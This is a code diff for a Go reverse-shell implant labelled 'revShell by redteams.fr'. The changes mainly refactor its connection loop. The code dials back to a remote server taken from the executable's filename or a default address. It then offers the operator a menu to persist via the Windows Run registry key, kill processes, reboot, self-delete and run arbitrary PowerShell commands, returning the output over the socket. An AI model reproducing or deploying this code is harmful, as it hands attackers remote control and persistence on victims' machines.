@@ -29,16 +29,39 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 	for {
 		conn, err := net.Dial("tcp", serverAddress)
 		if err != nil {
+			fmt.Println("Failed to connect to server. Retrying...")
 			time.Sleep(retryInterval)
 			continue
 		}
 
+		fmt.Println("Connected to server at address:", serverAddress)
+
+		scanner := bufio.NewScanner(conn)
+
 		for {
-			menu := "\nrevShell by redteams.fr\n1: Create an empty file on the desktop\n2: Show a MessageBox\n3: Persist in Run registry key\n4: List processes with PIDs\n5: Kill process (requires PID)\n6: Rickroll\n7: Self delete and Exit\n8: Reboot\n9: GetUID\n10: Execute PowerShell command\n"
+			menu := `
+revShell by redteams.fr
+1: Create an empty file on the desktop
+2: Show a MessageBox
+3: Persist in Run registry key
+4: List processes with PIDs
+5: Kill process (requires PID)
+6: Rickroll
+7: Self delete and Exit
+8: Reboot
+9: GetUID
+10: Execute PowerShell command
+`
+
 			conn.Write([]byte(menu))
 
-			buffer, _ := bufio.NewReader(conn).ReadString('\n')
-			command := strings.TrimSpace(buffer)
+			if !scanner.Scan() {
+				fmt.Println("Connection lost. Retrying...")
+				conn.Close()
+				break
+			}
+
+			command := strings.TrimSpace(scanner.Text())
 
 			switch command {
 			case "1":
@@ -96,7 +119,7 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 					conn.Write([]byte(fmt.Sprintf("Failed to execute whoami: %v\n", err)))
 				} else {
 					conn.Write([]byte(fmt.Sprintf("Current user: %s\n", output)))
-				}						
+				}
 			case "10":
 				conn.Write([]byte("Enter PowerShell command to execute: "))
 				psCommandBuffer, _ := bufio.NewReader(conn).ReadString('\n')
@@ -109,8 +132,7 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 				} else {
 					conn.Write([]byte(fmt.Sprintf("Output: %s\n", output)))
 				}
-				
-				
+
 			default:
 				conn.Write([]byte("Invalid option\n"))
 			}
@@ -118,7 +140,7 @@ func reverseShell(serverAddress string, waitTime time.Duration) {
 	}
 }
 
-func parseAddressAndWaitFromFilename() (string, time.Duration, error) {
+func parseFilename() (string, time.Duration, error) {
 	filename := filepath.Base(os.Args[0])
 	filename = strings.TrimSuffix(filename, ".exe")
 
@@ -153,8 +175,8 @@ func parseAddressAndWaitFromFilename() (string, time.Duration, error) {
 }
 
 func main() {
-	serverAddress, waitTime, _ := parseAddressAndWaitFromFilename()
-	if serverAddress =="" {
+	serverAddress, waitTime, _ := parseFilename()
+	if serverAddress == "" {
 		serverAddress = defaultServerAddress
 		waitTime = defaultWaitTime
 	}
